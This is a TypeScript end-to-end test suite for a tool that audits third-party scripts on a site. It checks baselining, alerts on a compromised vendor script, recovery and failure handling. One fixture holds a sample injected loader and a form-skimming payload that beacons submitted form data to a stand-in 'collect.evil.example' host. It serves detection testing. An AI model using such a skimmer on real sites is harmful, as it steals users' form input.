/**
 * End to end with a real browser against the local test site: baseline, a compromised
 * vendor script that pulls in code from a new host, and the vendor's recovery.
 */
import { access, mkdtemp, readFile, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import type { BrowserContext } from 'playwright';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { parseConfig, type Config } from '../src/config.js';
import type { Notifier } from '../src/notify/types.js';
import type { RunReport } from '../src/report.js';
import type { ReviewRequest, ReviewResult, Reviewer } from '../src/review/types.js';
import { runAudit, unreviewedScripts } from '../src/run.js';
import { DataStore, emptyState, type ScriptRecord } from '../src/state.js';
import { startTestSite, type TestSite } from './helpers/site-server.js';

class KeywordReviewer implements Reviewer {
  readonly provider = 'fake';
  readonly model = 'keyword';
  readonly reviewed: string[] = [];

  async review(request: ReviewRequest): Promise<ReviewResult> {
    this.reviewed.push(request.url);
    const evil = request.analysis.excerpt.includes('evil');
    return evil
      ? { verdict: 'malicious', confidence: 0.9, summary: 'Loads code from evil.', reasons: ['x'] }
      : { verdict: 'benign', confidence: 0.8, summary: 'Routine.', reasons: [] };
  }
}

class CapturingNotifier implements Notifier {
  readonly name = 'capture';
  readonly reports: RunReport[] = [];

  async notify(report: RunReport): Promise<boolean> {
    this.reports.push(report);
    return true;
  }
}

describe('runAudit', () => {
  let site: TestSite;
  let dir: string;
  let config: Config;
  const reviewer = new KeywordReviewer();
  const notifier = new CapturingNotifier();

  const audit = (contextHook?: (context: BrowserContext) => Promise<void>) =>
    runAudit({
      config,
      dataDir: join(dir, 'data'),
      siteDir: join(dir, 'site'),
      reviewer,
      notifiers: [notifier],
      ...(contextHook ? { crawlOptions: { contextHook } } : {}),
      runUrl: 'https://ci.example/run/1',
    });

  beforeAll(async () => {
    site = await startTestSite();
    dir = await mkdtemp(join(tmpdir(), 'script-auditor-run-'));
    config = parseConfig({
      pages: [{ url: `${site.firstParty}/`, name: 'Home' }, `${site.firstParty}/page2`],
      firstPartyDomains: ['localhost'],
      consent: { selector: '.accept', timeoutSeconds: 5 },
      crawl: { settleSeconds: 0.5, scrollStepPixels: 1500, pageTimeoutSeconds: 10 },
      site: { title: 'Test audit', url: 'https://audit.example/' },
    });
  });

  afterAll(async () => {
    await site?.close();
    await rm(dir, { recursive: true, force: true });
  });

  it('records the first run as baseline', async () => {
    const { report } = await audit();
    expect(report.baseline).toBe(true);
    expect(report.alerts).toEqual([]);
    expect(report.errors).toEqual([]);
    expect(report.stats).toMatchObject({ pages: 2, scripts: 4, hosts: 1, changes: 0 });
    expect(reviewer.reviewed).toEqual([]);
    const index = await readFile(join(dir, 'site', 'index.html'), 'utf8');
    expect(index).toContain('Test audit');
  });

  it('alerts on a compromised vendor script and the code it pulls in', async () => {
    const injected = `window.vendor = function () { return 1; };
      (function () { var s = document.createElement('script'); s.src = 'https://cdn.evil.example/x.js'; document.head.appendChild(s); })();`;
    const { report, notified } = await audit(async (context) => {
      await context.route(`${site.thirdParty}/vendor.js*`, (route) =>
        route.fulfill({ contentType: 'text/javascript', body: injected }),
      );
      await context.route('https://cdn.evil.example/**', (route) =>
        route.fulfill({
          contentType: 'text/javascript',
          body: 'document.addEventListener("submit",function(e){navigator.sendBeacon("https://collect.evil.example",new FormData(e.target))});',
        }),
      );
    });

    expect(notified).toEqual(['capture']);
    expect(report.baseline).toBe(false);
    const alerts = Object.fromEntries(report.alerts.map((alert) => [alert.host, alert]));
    expect(Object.keys(alerts).sort()).toEqual(['127.0.0.1', 'cdn.evil.example']);
    expect(alerts['127.0.0.1']).toMatchObject({ newHost: false, review: { verdict: 'malicious' } });
    expect(alerts['cdn.evil.example']).toMatchObject({
      newHost: true,
      review: { verdict: 'malicious' },
      url: 'https://cdn.evil.example/x.js',
    });
    expect(alerts['cdn.evil.example']!.pages).toEqual([
      `${site.firstParty}/`,
      `${site.firstParty}/page2`,
    ]);
    expect(report.changes.map((change) => change.kind).sort()).toEqual(['changed', 'new']);

    const state = await new DataStore(join(dir, 'data')).load(new Date());
    expect(state.pending).toEqual([]);
    expect(state.hosts['cdn.evil.example']).toBeDefined();
    const index = await readFile(join(dir, 'site', 'index.html'), 'utf8');
    expect(index).toContain('2 need attention');
  });

  it('settles when the vendor serves its known good version again', async () => {
    const before = reviewer.reviewed.length;
    const { report } = await audit();
    expect(report.changes).toEqual([]);
    expect(report.alerts).toEqual([]);
    expect(reviewer.reviewed.length).toBe(before);
    expect(report.stats.absorbed).toBe(1);
  });
});

// Earlier tests always had at least one reachable page, so a run that saw nothing still
// advanced the state and exited successfully.
describe('runAudit when no page can be scanned', () => {
  let site: TestSite;
  let dir: string;

  beforeAll(async () => {
    site = await startTestSite();
    dir = await mkdtemp(join(tmpdir(), 'script-auditor-down-'));
  });

  afterAll(async () => {
    await site?.close();
    await rm(dir, { recursive: true, force: true });
  });

  it('fails and leaves the audit data alone', async () => {
    const config = parseConfig({
      pages: [`${site.firstParty}/missing`, `${site.firstParty}/also-missing`],
      firstPartyDomains: ['localhost'],
      crawl: { settleSeconds: 0, pageTimeoutSeconds: 10 },
    });
    await expect(runAudit({ config, dataDir: join(dir, 'data') })).rejects.toThrow(
      /None of the 2 pages could be scanned/,
    );
    await expect(access(join(dir, 'data', 'state.json'))).rejects.toThrow();
  });
});

describe('unreviewedScripts', () => {
  const script = (key: string, extra: Partial<ScriptRecord> = {}): ScriptRecord => ({
    key,
    url: key,
    host: 'cdn.example.net',
    sha256: `sha-${key}`,
    size: 1,
    firstSeen: '',
    lastSeen: '',
    lastChanged: '',
    pages: ['https://site.example/'],
    versions: [{ sha256: `sha-${key}`, size: 1, url: key, firstSeen: '', lastSeen: '' }],
    ...extra,
  });

  it('lists scripts no version of which was reviewed, also after the first run', () => {
    const state = emptyState(new Date());
    state.runs = 3;
    state.scripts['a'] = script('a');
    state.scripts['b'] = script('b', {
      versions: [
        { sha256: 'old', size: 1, url: 'b', firstSeen: '', lastSeen: '', reviewKey: 'new:old' },
        { sha256: 'sha-b', size: 1, url: 'b', firstSeen: '', lastSeen: '' },
      ],
    });
    state.scripts['c'] = script('c', { perRequest: true });
    expect(unreviewedScripts(state)).toEqual([
      {
        kind: 'new',
        key: 'a',
        url: 'a',
        host: 'cdn.example.net',
        newSha256: 'sha-a',
        pages: ['https://site.example/'],
        newHost: false,
        quietHost: false,
      },
    ]);
  });
});
